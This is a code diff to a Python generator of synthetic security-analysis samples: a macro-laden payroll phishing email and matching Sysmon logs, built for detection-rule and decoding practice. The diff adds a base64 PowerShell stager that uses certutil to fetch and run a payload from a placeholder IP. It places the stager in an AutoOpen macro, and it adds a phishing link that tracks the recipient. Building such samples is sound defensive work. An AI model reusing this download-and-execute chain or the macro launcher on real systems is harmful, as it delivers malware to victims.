@@ -20,6 +20,7 @@ Samples are byte-for-byte deterministic, so loading one twice reopens the
 same analysis (same MD5) instead of creating another.
 """
 
+import base64
 import io
 import json
 import random
@@ -32,6 +33,21 @@ from email.policy import SMTP
 # The EICAR test string - a harmless file antivirus and YARA rulesets flag
 # by design - in two halves, so this file itself never matches.
 EICAR = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$' + b'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+
+
+# What the macro runs: PowerShell decoding and running a base64 stager -
+# certutil fetching the payload from the email's originating IP, then
+# starting it. Plain ASCII base64 (decoded with FromBase64String), not
+# -EncodedCommand's UTF-16, so CyberChef's Magic decodes it in one step.
+_STAGER = ('certutil -urlcache -split -f http://203.0.113.66/update.bin C:\\Users\\Public\\update.exe; '
+           'Start-Process C:\\Users\\Public\\update.exe')
+_STAGER_COMMAND = ('powershell.exe -nop -w hidden -c "IEX([Text.Encoding]::ASCII.GetString('
+                   "[Convert]::FromBase64String('%s')))\"" % base64.b64encode(_STAGER.encode()).decode())
+# The phishing link carries the recipient's address, base64-encoded, so the
+# sender knows who clicked - CyberChef decodes it.
+_RECIPIENT = 'jordan.lee@corp.example'
+_PHISH_URL = ('https://northbridgepay.example.account-verify.example/session?u='
+              + base64.b64encode(_RECIPIENT.encode()).decode())
 
 
 def _macro_document():
@@ -63,7 +79,7 @@ def _macro_document():
         'word/vbaProject.bin': (
             b'Attribute VB_Name = "ThisDocument"\r\n'
             b'Sub AutoOpen()\r\n'
-            b'    Shell "powershell.exe -nop -w hidden -enc SQBFAFgA...", vbHide\r\n'
+            b'    Shell "' + _STAGER_COMMAND.replace('"', '""').encode() + b'", vbHide\r\n'
             b'End Sub\r\n' + EICAR),
     }
     buf = io.BytesIO()
@@ -130,7 +146,7 @@ def build_email_sample():
         '<p>Dear Jordan,</p>'
         '<p>Your February direct deposit is <b>on hold</b>. To avoid a delay in your pay, '
         'confirm your bank details today:</p>'
-        '<p><a href="https://northbridgepay.example.account-verify.example/session?id=7731">'
+        f'<p><a href="{_PHISH_URL}">'
         'https://portal.northbridgepay.example/login</a></p>'
         '<p>You can also complete the attached Payroll Adjustment form. '
         "We've attached our earlier notice for reference.</p>"
@@ -172,23 +188,22 @@ def _process(time, pid, image, command_line, parent_pid, parent_image, parent_co
 
 def build_log_sample():
     """Sysmon events, one JSON object per line, from the workstation that
-    opened the sample email's payroll form: Word starts encoded PowerShell,
-    certutil downloads the payload from the email's originating IP, and the
-    payload enumerates the user, persists (scheduled task and Run key),
-    hunts for saved credentials and connects out to upload them by FTP -
-    the connection the pcap sample shows. Built to fire long-standing
-    SigmaHQ rules with the built-in ruleset."""
+    opened the sample email's payroll form: Word starts PowerShell running
+    a base64-encoded stager (_STAGER_COMMAND), certutil downloads the
+    payload from the email's originating IP, and the payload enumerates
+    the user, persists (scheduled task and Run key), hunts for saved
+    credentials and connects out to upload them by FTP - the connection
+    the pcap sample shows. Built to fire long-standing SigmaHQ rules with
+    the built-in ruleset."""
     events = [
         _process('2026-02-03T08:44:02.118Z', 6120, _WORD,
                  '"WINWORD.EXE" /n "C:\\Users\\jordan.lee\\Downloads\\Payroll_Adjustment_Form.docm"',
                  3312, 'C:\\Windows\\explorer.exe', 'C:\\Windows\\Explorer.EXE'),
         _process('2026-02-03T08:44:19.540Z', 7044, _POWERSHELL,
-                 'powershell.exe -nop -w hidden -enc '
-                 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
-                 6120, _WORD, '"WINWORD.EXE" /n "Payroll_Adjustment_Form.docm"'),
+                 _STAGER_COMMAND, 6120, _WORD, '"WINWORD.EXE" /n "Payroll_Adjustment_Form.docm"'),
         _process('2026-02-03T08:44:31.007Z', 7208, 'C:\\Windows\\System32\\certutil.exe',
                  f'certutil.exe -urlcache -split -f http://203.0.113.66/update.bin {_DROPPED}',
-                 7044, _POWERSHELL, 'powershell.exe -nop -w hidden -enc SQBFAFgA...'),
+                 7044, _POWERSHELL, _STAGER_COMMAND),
         dict(_SYSMON, EventID=3, SystemTime='2026-02-03T08:44:31.412Z', ProcessId=7208,
              Image='C:\\Windows\\System32\\certutil.exe', User='CORP\\jordan.lee', Protocol='tcp',
              Initiated='true', SourceIp='10.20.4.12', SourcePort=51733,
